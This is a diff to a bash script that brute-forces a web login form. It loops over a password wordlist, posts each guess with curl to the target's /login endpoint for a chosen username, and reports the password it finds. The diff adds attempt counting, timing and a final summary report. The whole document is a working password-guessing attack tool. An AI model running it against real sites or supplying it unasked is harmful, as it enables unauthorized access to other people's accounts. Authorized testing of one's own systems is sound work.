@@ -87,21 +87,47 @@ begin(){
 	echo "	Date	: $_date"
 	printf "===================================================\n\n"
 
+	attempts=0
+	start=$(date +%s%N)
 
 	while read -r pass
 	do
 
-		response=$(curl -X Post "$url/login" -d "username=$user&password=$pass")
+		[[ -z "$pass" ]] && continue
 
-		if [[ "$response" == *fail* ]]; then 
+		response=$(curl -s -X Post "$url/login" -d "username=$user&password=$pass")
+
+		((attempts++))
+
+		if [[ "$response" == *fail* ]]; then
 
 			echo "[-] Trying: $pass"
+
 		elif [[ "$response" == *success* ]]; then
 
+			end=$(date +%s%N)
+
+			elapsed=$((end - start))
+			in_sec=$(awk "BEGIN {printf \"%.2f\", $elapsed / 1000000000}")
+
 			echo "[+] FOUND → $user:$pass"
-			exit 1
+			final_report "$pass" "$attempts" "$in_sec"
 		fi
 	done < "$wl"
+}
+final_report(){
+
+	pass="$1"
+	atmps="$2"
+	_time="$3"
+
+	printf "\n=======================================\n"
+	printf "[*] %-10s : %s\n" "Password" "$pass"
+	printf "[*] %-10s : %s\n" "Attempts" "$atmps"
+	printf "[*] %-10s : %ss\n" "Time" "$_time"
+	printf "=========================================="
+
+	exit 1
 }
 while getopts ":u:U:w:" opts
 do
